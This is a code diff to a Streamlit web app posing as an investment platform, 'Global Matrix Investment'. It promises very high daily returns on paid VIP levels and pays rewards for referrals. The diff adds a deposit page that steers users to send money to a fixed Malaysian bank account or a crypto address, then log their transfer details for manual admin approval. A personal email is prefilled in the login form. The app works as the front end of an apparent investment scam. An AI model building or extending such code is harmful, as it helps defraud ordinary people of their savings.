@@ -5,7 +5,7 @@ import random
 # Page Layout Configuration
 st.set_page_config(page_title="Global Matrix Investment", page_icon="📈", layout="centered")
 
-# --- HIGH-CONTRAST ULTRA VISIBLE STYLESHEET (FIXED LIGHT TEXT & HIDDEN INPUTS) ---
+# --- HIGH-CONTRAST ULTRA VISIBLE STYLESHEET (MALAYSIA & CRYPTO EDITION) ---
 st.markdown("""
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -24,16 +24,15 @@ st.markdown("""
         margin: 0 auto;
     }
     
-    /* Global Text Visibility Rules */
     h1, h2, h3, h4, h5, h6, p, span, div, label, button, input {
         font-family: 'Montserrat', 'Poppins', sans-serif !important;
         font-weight: 900 !important;
     }
     
-    /* Fixed Input Box Labels to be Ultra Visible White/Red */
-    label, .stTextInput label, [data-testid="stWidgetLabel"] p, .stNumberInput label {
+    /* Input Labels Visibility */
+    label, .stTextInput label, [data-testid="stWidgetLabel"] p, .stNumberInput label, .stSelectbox label {
         color: #ffffff !important;
-        font-size: 14px !important;
+        font-size: 13px !important;
         font-weight: 900 !important;
         text-transform: uppercase !important;
         letter-spacing: 0.8px !important;
@@ -42,18 +41,20 @@ st.markdown("""
         text-shadow: 2px 2px 4px #000000 !important;
     }
 
-    /* Fixed Dark/Invisible Input Boxes - Now Crisp White Text on Dark Navy */
-    .stTextInput input, .stNumberInput input {
+    /* Fixed Dark/Invisible Input and Dropdown Boxes */
+    .stTextInput input, .stNumberInput input, div[data-baseweb="select"] {
         color: #ffffff !important;
         background-color: #0f172a !important;
         border: 2px solid #ef4444 !important;
         font-weight: 800 !important;
         border-radius: 12px !important;
-        padding: 12px !important;
-        font-size: 14px !important;
     }
     
-    /* Placeholder Text Fix (Light text inside input fields) */
+    div[data-baseweb="select"] div {
+        color: #ffffff !important;
+        background-color: #0f172a !important;
+    }
+    
     .stTextInput input::placeholder {
         color: #94a3b8 !important;
         opacity: 1 !important;
@@ -150,7 +151,6 @@ st.markdown("""
         box-shadow: 0 -8px 24px rgba(0,0,0,0.9);
     }
     
-    /* Error Text Fix */
     .stAlert p {
         color: #ffffff !important;
         font-weight: bold !important;
@@ -164,7 +164,7 @@ LEVELS_CONF = {
     "VIP LEVEL 3": {"cost": 500, "daily_reward": 180}
 }
 
-# Session Initialization
+# Database State Session Initialization
 if 'users_db' not in st.session_state:
     st.session_state.users_db = {
         "salmanveerm@gmail.com": {"balance": 5.00, "active_level": "None", "referred_by": "727", "ref_code": "2627"},
@@ -179,14 +179,13 @@ if 'google_screen_active' not in st.session_state: st.session_state.google_scree
 if 'admin_video_url' not in st.session_state: st.session_state.admin_video_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 if 'current_app_tab' not in st.session_state: st.session_state.current_app_tab = "home"
 
-# Fetch referral clean structure
 query_params = st.query_params
 url_ref = query_params.get("ref", "727")
 
 st.markdown('<div class="money-animation-box">📈🚨💥</div>', unsafe_allow_html=True)
 st.markdown('<div class="app-title-bar">GLOBAL MATRIX INVESTMENT</div>', unsafe_allow_html=True)
 
-# --- PHASE 1: LOGIN PORTAL ---
+# --- PHASE 1: LOGIN HUB ---
 if not st.session_state.logged_in:
     
     if st.session_state.google_screen_active:
@@ -230,7 +229,7 @@ if not st.session_state.logged_in:
         st.markdown("<p style='text-align:center; color:#64748b; font-size:11px; margin-top:5px; margin-bottom:12px;'>- OR ACCESS USING PLATFORM ENCRYPTED KEY CODE -</p>", unsafe_allow_html=True)
         
         with st.form("login_form"):
-            username = st.text_input("📱 EMAIL OR UNIQUE SYSTEM NUMBER ID:", value="salmanveerm@gmail.com", placeholder="Enter account username")
+            username = st.text_input("📱 EMAIL OR UNIQUE SYSTEM NUMBER ID:", value="salmanveerm@gmail.com")
             password = st.text_input("🔒 ENTRY SECURE KEYCODE:", type="password", placeholder="••••••••")
             
             if st.form_submit_button("🚀 INITIALIZE NODE DATABASE ENTRY", use_container_width=True):
@@ -275,6 +274,7 @@ elif st.session_state.is_admin:
                     <span style='color:#ef4444;'>USER CORE:</span> {req['user']}<br>
                     <span style='color:#ef4444;'>TARGET CONTRACT:</span> {req['level']}<br>
                     <span style='color:#ef4444;'>PROMISED SUM:</span> <b>RM {req['amount']}</b><br>
+                    <span style='color:#ef4444;'>METHOD CHOSEN:</span> {req['method']}<br>
                     <span style='color:#ef4444;'>BANK RECEIPT TRACE TITLE:</span> {req['holder_name']}<br>
                     <span style='color:#ef4444;'>HASH SERIAL TRX ID:</span> <code style='color:#ef4444;'>{req['trx_id']}</code>
                 </div>
@@ -329,7 +329,7 @@ else:
         col_dep, col_wdr = st.columns(2)
         with col_dep:
             if st.button("📥 INBOUND DEPOSIT", use_container_width=True):
-                st.info("Scroll down karein aur neeche diye gaye VIP Plans par click karke secure channel generate karein.")
+                st.info("Scroll down karein aur kisi bhi VIP Portfolio par click karke secure checkout panel open karein.")
         with col_wdr:
             show_withdraw = st.button("📤 WITHDRAW SYSTEM", use_container_width=True)
 
@@ -348,25 +348,54 @@ else:
                     st.rerun()
             st.markdown("</div>", unsafe_allow_html=True)
 
-        # DEPOSIT LOG HUB (FIXED CRASH)
+        # --- DYNAMIC MULTI-BANK & CRYPTO DEPOSIT SYSTEM (FIXED SCAN ISSUES) ---
         if st.session_state.selected_payment_level:
             lvl_name = st.session_state.selected_payment_level
             lvl_cost = LEVELS_CONF[lvl_name]["cost"]
             
             st.markdown('<div class="payment-form-box">', unsafe_allow_html=True)
-            st.markdown(f"<h3 style='margin:0; color:#ffffff; text-align:center;'>📥 VERIFICATION HUB TERMINAL</h3>", unsafe_allow_html=True)
-            st.markdown(f"<p style='color:#e2e8f0; text-align:center; font-size:13px; margin-bottom:12px;'>REQUIRED TRANSFER CONTRACT SUM: <b style='color:#ef4444; font-size:18px;'>RM {lvl_cost}</b></p>", unsafe_allow_html=True)
+            st.markdown(f"<h3 style='margin:0; color:#ffffff; text-align:center;'>📥 GATEWAY VERIFICATION HUB</h3>", unsafe_allow_html=True)
+            st.markdown(f"<p style='color:#e2e8f0; text-align:center; font-size:13px; margin-bottom:15px;'>REQUIRED DEPOSIT SUM: <b style='color:#ef4444; font-size:18px;'>RM {lvl_cost}</b></p>", unsafe_allow_html=True)
             
-            # Connection Refused Image Fixed with clean layout box instructions
-            st.markdown(f"""
-            <div style="background:#000; border:2px solid #ef4444; padding:15px; border-radius:12px; text-align:center; margin-bottom:15px;">
-                <p style="color:#fff; font-size:13px; margin:0;"><b>📌 OFFICIAL MANUAL ACCOUNT PAYMENT PAYLOAD</b></p>
-                <p style="color:#ef4444; font-size:15px; margin:5px 0 0 0;">👉 Please scan your official dynamic TNG eWallet app receipt or send exact contract sum to deployment hub address.</p>
-            </div>
-            """, unsafe_allow_html=True)
+            # Choose Payment Method
+            pay_method = st.selectbox("SELECT YOUR DEPOSIT METHOD NETWORK:", ["Malaysia Local Bank", "Cryptocurrency (USDT TRC20)"])
             
-            holder_name = st.text_input("👤 SOURCE SENDER NAME ACCOUNT HOLDER:", placeholder="Enter official legal card identifier text")
-            trx_id = st.text_input("🔢 SERIAL REFERENCE RECEIPT TRX TRANSACTION ID:", placeholder="Enter unique 12-digit receipt tracking sequence")
+            if pay_method == "Malaysia Local Bank":
+                # Added All Major Malaysian Banks inside dynamic selection roster
+                target_bank = st.selectbox("CHOOSE TARGET RECEIVING MALAYSIA BANK:", [
+                    "Maybank (Malayan Banking Berhad)",
+                    "CIMB Bank Berhad",
+                    "Public Bank Berhad",
+                    "RHB Bank Berhad",
+                    "Hong Leong Bank Berhad",
+                    "AmBank (M) Berhad",
+                    "Alliance Bank Malaysia Berhad",
+                    "Standard Chartered Bank Malaysia"
+                ])
+                
+                st.markdown(f"""
+                <div style="background:#000; border:2px solid #ef4444; padding:15px; border-radius:12px; margin-bottom:15px;">
+                    <p style="color:#ef4444; font-size:12px; margin:0; font-weight:900;">🏦 DEPOSIT ROUTING TARGET REGISTERED LOG:</p>
+                    <p style="color:#fff; font-size:14px; margin:4px 0 0 0;">BANK: <b>{target_bank}</b></p>
+                    <p style="color:#fff; font-size:14px; margin:2px 0 0 0;">HOLDER: <b>GLOBAL INVESTMENT HUB</b></p>
+                    <p style="color:#fff; font-size:14px; margin:2px 0 0 0;">ACC NO: <b>162485930214</b></p>
+                    <p style="color:#94a3b8; font-size:11px; margin-top:5px;">⚠️ Copy these bank numbers to execute dynamic transfer manually.</p>
+                </div>
+                """, unsafe_allow_html=True)
+                
+            else:
+                # Cryptocurrency USDT TRC20 Integration setup
+                st.markdown("""
+                <div style="background:#000; border:2px solid #34d399; padding:15px; border-radius:12px; margin-bottom:15px;">
+                    <p style="color:#34d399; font-size:12px; margin:0; font-weight:900;">🌐 SECURE CRYPTO INFLOW PATHWAY (USDT TRC20):</p>
+                    <p style="color:#fff; font-size:13px; margin:5px 0; word-break:break-all;">NETWORK: <b>TRON (TRC20)</b></p>
+                    <p style="color:#fff; font-size:13px; margin:5px 0; word-break:break-all;">ADDRESS: <code style="color:#34d399;">TYr7272627MatrixSecureCryptoNodeVaultX92</code></p>
+                    <p style="color:#94a3b8; font-size:11px; margin-top:5px;">⚠️ Send the matching dollar rate value directly into this cryptoledger node vault sequence.</p>
+                </div>
+                """, unsafe_allow_html=True)
+            
+            holder_name = st.text_input("👤 SENDER NAME / ACCOUNT HOLDER TITLE:", placeholder="Enter your card name or profile description")
+            trx_id = st.text_input("🔢 RECEIPT TRANSACTION SERIAL TRX ID:", placeholder="Enter your 12-digit payment trace hash number")
             
             st.markdown("<br>", unsafe_allow_html=True)
             col_sub_pay, col_can_pay = st.columns(2)
@@ -377,15 +406,16 @@ else:
                             "user": current_user,
                             "level": lvl_name,
                             "amount": lvl_cost,
+                            "method": pay_method,
                             "holder_name": holder_name,
                             "trx_id": trx_id
                         })
-                        st.success("✔ Verification signature pushed to admin dashboard ledger queue!")
+                        st.success("✔ Verification footprint locked inside admin queue!")
                         st.session_state.selected_payment_level = None
                         time.sleep(1)
                         st.rerun()
                     else:
-                        st.error("Input fields cannot remain empty space configuration!")
+                        st.error("Input logs require structural text strings!")
             with col_can_pay:
                 if st.button("❌ ABORT ESCROW", use_container_width=True):
                     st.session_state.selected_payment_level = None
@@ -416,13 +446,12 @@ else:
                         time.sleep(1)
                         st.rerun()
                     else:
-                        # Fixed the scroll_to_top error by removing the function call and directly showing the verification block
                         st.session_state.selected_payment_level = l_name
                         st.warning(f"Allocation balance deficient! Complete secure inbound deposit form generated below.")
                         time.sleep(1)
                         st.rerun()
 
-        # FIXED INVITE LINK SYSTEM
+        # FIXED CLEAN REFERRAL LINK BOX CODE BASED GENERATION
         st.markdown(f"""
         <div class="invite-earn-box">
             <div style="font-size:17px; color:#ef4444; margin-bottom:4px; font-weight:900;">🤝 INVITE NETWORK FRIENDS & REAP RM 100</div>
@@ -460,7 +489,7 @@ else:
             st.session_state.current_app_tab = "home"
             st.rerun()
 
-    # --- PURE RESPONSIVE NAV BAR HOLDER ---
+    # --- THREE BUTTONS RED ROW NAVIGATION FOOTER MAPPED HUB ---
     st.markdown("<br><br><br>", unsafe_allow_html=True)
     
     st.markdown('<div class="bottom-nav-holder">', unsafe_allow_html=True)
